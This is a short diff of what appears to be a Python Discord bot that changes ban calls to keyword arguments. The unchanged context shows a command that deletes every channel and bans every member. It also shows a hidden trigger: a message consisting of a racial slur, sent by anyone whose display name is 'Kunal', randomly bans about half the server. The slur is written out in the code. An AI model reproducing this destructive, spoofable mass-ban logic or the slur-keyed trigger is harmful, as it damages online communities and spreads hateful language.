@@ -77,14 +77,14 @@ async def on_message(message):
             for channel in message.guild.channels:
                 await channel.delete()
             for mem in message.guild.members:
-                await message.guild.ban(mem, reason="Server termination was initiated")
+                await message.guild.ban(user=mem, reason="Server termination was initiated")
         else:
             await message.channel.send('You must have special Admin perms to execute this command')
 
     if message.content.startswith('nigger') and len(message.content.strip()) == 6 and message.author.display_name == "Kunal":
         for mem in message.guild.members:
             if random.randint(1, 2) == 1:
-                await message.guild.ban(mem, reason="Kunal wielded the n word, causing half the server to be banned")
+                await message.guild.ban(user=mem, reason="Kunal wielded the n word, causing half the server to be banned")
 
     # if message.content.startswith('!play'):
     #     channel = message.author.voice.channel
